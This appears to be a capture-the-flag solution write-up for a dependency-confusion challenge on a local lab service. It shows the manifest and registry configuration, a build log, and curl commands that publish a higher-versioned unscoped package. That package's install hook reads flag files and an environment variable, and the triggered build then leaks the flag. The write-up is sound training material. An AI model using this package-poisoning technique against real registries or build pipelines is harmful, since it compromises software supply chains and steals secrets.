# Solution: A03 Medium — Dual-Registry Dependency Confusion & Package Poisoning

### 1. Enumeration & Manifest Analysis
1. Query the project manifest endpoint:
   ```bash
   curl -s http://127.0.0.1:6008/api/v1/workspace/manifest | jq .
   ```
2. In `package.json`:
   ```json
   {
     "dependencies": {
       "@finguard/vault-core": "^3.1.0",
       "@finguard/transaction-crypto": "^2.0.4",
       "express": "^4.19.2",
       "helmet": "^7.1.0",
       "dotenv": "^16.4.5",
       "finguard-metrics-collector": ">=1.1.0"
     }
   }
   ```
   And in `.npmrc`:
   ```text
   @finguard:registry=https://npm.internal.finguard.net
   registry=https://registry.public-staging.net
   ```
3. Notice that `@finguard/*` packages are restricted to the internal registry, but `finguard-metrics-collector` is an **unscoped** package name with constraint `>=1.1.0`.

4. Inspecting the latest build log (`/api/v1/builds/481/log`):
   ```text
   [FETCH] -> finguard-metrics-collector@>=1.1.0 : querying public registry https://registry.public-staging.net/finguard-metrics-collector...
   [FETCH]    Not found in public registry (HTTP 404). Falling back to internal repository.
   [FETCH]    Matched internal finguard-metrics-collector@1.1.0
   ```

### 2. Exploitation via Public Registry Mirror
Publish `finguard-metrics-collector` at version `2.0.0` (or `99.0.0`) on the public mirror with a postinstall lifecycle script:
```bash
curl -s -X POST http://127.0.0.1:6008/api/v1/registry/publish \
  -H "Content-Type: application/json" \
  -d '{
    "name": "finguard-metrics-collector",
    "version": "2.0.0",
    "install_hook": "cat /tmp/flag.txt || cat /flag.txt || echo $FLAG",
    "description": "Public metrics collector"
  }'
```

### 3. Execution & Flag Recovery
Trigger the pipeline:
```bash
curl -s -X POST http://127.0.0.1:6008/api/v1/build/trigger | jq -r .log
```

In the output:
```text
[FETCH] -> finguard-metrics-collector@>=1.1.0 : querying public registry...
[FETCH]    Discovered upstream package 'finguard-metrics-collector@2.0.0'
[FETCH]    Upstream public version (2.0.0) satisfies requirement (>=1.1.0). Precedence: upstream.
[INSTALL] Executing package lifecycle hooks...
> finguard-metrics-collector@2.0.0 postinstall
  RTSA{a03-medium_...}
```
Submit the flag to the OSWAp portal.
